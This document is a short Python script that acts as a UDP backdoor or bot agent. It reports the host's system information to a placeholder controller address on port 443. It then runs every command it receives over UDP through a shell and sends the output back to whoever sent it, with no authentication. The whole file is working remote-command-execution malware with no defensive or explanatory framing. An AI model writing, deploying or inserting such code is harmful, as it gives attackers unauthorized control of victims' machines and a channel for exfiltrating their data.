#!/usr/bin/python3
import sys, socket, subprocess
controllerIP = 'whatever you want man'
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.bind(('0.0.0.0', 5151))
	try:
		uname = subprocess.check_output('uname -a', shell=True)
	except subprocess.CalledProcessError:
		uname = subprocess.check_output('ver', shell=True).lstrip()
			
	sock.sendto(uname, (controllerIP, 443))
	while True:
		command = sock.recvfrom(4096)
		#print(command)
		if not command:
			continue
		try:
			instruction = command[0].decode('utf-8')
			ipTuple = command[1]
			ip = ipTuple[0]
			#print(ip)
			output = subprocess.check_output(instruction, shell=True)
			sock.sendto((output), (ip, 6060))
		except OSError:
			ipTuple = command[1]
			ip = ipTuple[0]
			sock.sendto(bytes('Not a recognised command', 'utf-8'), (ip, 6060))
		except subprocess.CalledProcessError:
			ipTuple = command[1]
			ip = ipTuple[0]
			sock.sendto(bytes('oWo naughty, you can\'t do that', 'utf-8'), (ip, 6060))

except KeyboardInterrupt:
	print('KeyboardInterrupt')
